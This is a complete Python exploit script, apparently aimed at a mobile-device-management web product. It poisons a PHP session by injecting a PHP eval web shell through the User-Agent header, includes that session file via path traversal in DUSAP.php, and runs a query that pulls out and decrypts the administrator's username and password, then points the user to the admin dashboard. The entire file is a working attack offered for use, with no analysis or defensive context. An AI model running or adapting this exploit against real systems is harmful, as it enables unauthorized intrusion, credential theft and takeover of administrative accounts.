import httplib2,sys

if(len(sys.argv) != 2):
	print 'Usage: %s %s' % (sys.argv[0],'http://example.com:80')
	sys.exit()

s1_headers = {"User-Agent":"<?php echo(eval($_GET['cmd'])); ?>","Cookie":"PHPSESSID=payload;"}
s2_req = '/DUSAP.php?language=res/languages/../../../../php/temp/sess_payload&cmd=$pass%3dmdm_ExecuteSQLQuery("SELECT+UserName,Password+FROM+Administrators+where+AdministratorSAKey+%3d+1",array(),false,-1,"","","",QUERY_TYPE_SELECT)%3becho+"%0d%0a".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."%0d%0a"%3b'

url = sys.argv[1]

try:
	http = httplib2.Http()
	http.follow_redirects = False
	resp,cont = http.request(url+"/download.php","HEAD",headers=s1_headers)
except:
	print '[?] Error connecting to the target.'
	print '[?] Dump..', sys.exc_info()
	sys.exit()

if(resp['status'] == '302'):
	try:
		print "[*] Session Poisoned, Retrieving Creds."
		resp,cont = http.request(url+s2_req) 
		creds = cont.split("\r\n")[1].split(":")
		print "[+] Credentials User: %s Password: %s" % (creds[0],creds[1])
		print "[!] Log into the administrative interface at: %s/dashboard/" % (sys.argv[1])
	except httplib2.HttpLib2Error as e:
		print '[?] Error retrieving creds'
		print '[?] ', e.strerror
	except:
		print '[?] Something happened...'
		print '[?] Dumping response', cont
		print '[?] Dump..', sys.exc_info()

			

	
